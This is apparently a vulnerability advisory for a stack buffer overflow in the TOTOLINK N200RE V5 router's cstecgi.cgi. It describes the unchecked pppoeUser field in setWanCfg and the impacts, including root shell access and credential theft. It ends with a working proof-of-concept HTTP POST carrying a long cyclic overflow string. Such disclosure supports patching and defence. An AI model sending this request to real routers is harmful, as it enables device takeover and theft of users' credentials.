# TOTOLINK N200RE V5 Router

- **Vendor**：TOTOLINK
- **Product**：N200RE V5
- **Firmware Version**：V9.3.5u.6469_B20251023
- **Vulnerability Type**：Stack Buffer Overflow

---

## Description

The vulnerability is located in the `sub_41BCF8` function of the firmware web backend `www/cgi-bin/cstecgi.cgi`. When handling a PPPoE request (`proto=3`), the function directly retrieves the user-submitted `pppoeUser` parameter via `websGetVar()` **without performing any length validation**, and then in three branches copies it via `sprintf()` / `strcpy()` into stack buffers of only 64/128 bytes, causing a stack overflow.

## Impact

An attacker who successfully exploits this vulnerability (requiring administrator credentials, or in combination with default/weak passwords or authentication bypass) can:

- **Fully control the device**: execute arbitrary commands with root privileges and obtain an interactive shell;
- **Steal sensitive data**: read /etc/shadow, Wi-Fi passwords, PPPoE dial-up account credentials, etc.;
- **Achieve persistent residency**: write startup scripts and tamper with firmware configurations;
- **Cause denial of service**: at a minimum, crash the web service process.

## Vulnerability Details

This vulnerability exists in the WAN port configuration functionality of the firmware web backend cstecgi.cgi. When an attacker submits a PPPoE dial-up configuration request to the setWanCfg interface, the backend handler retrieves the pppoeUser field (i.e., the broadband dial-up username) from the request. This field is taken verbatim from the HTTP request and never undergoes any length check or character filtering throughout the process.

The user input `v12` (pppoeUser) retrieved at line 97 is not filtered in any way and reaches the following three dangerous copy functions directly.

<img width="844" height="574" alt="ede36d1f7b82a0e316ac002f53029ce" src="https://github.com/user-attachments/assets/07332eae-56ea-48ce-90cc-f2c196f22b62" />


![image-20261027151646540](C:\Users\34028\AppData\Roaming\Typora\typora-user-images\image-20261027151646540.png)

`pppoeUser` has no validation whatsoever—proving that the overflow point is a remediation oversight rather than by design.

### Exploit

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 127.0.0.1:8181
Content-Length: 2118
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://127.0.0.1:8181
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8181/login.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


{"topicurl":"setWanCfg","proto":"3","pppoeSpecType":"3","pppoeUser":"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaat","pppoePass":"x","opmode":"","switchOpMode":"0"}
```

![image-20261027153341760](C:\Users\34028\AppData\Roaming\Typora\typora-user-images\image-20261027153341760.png)
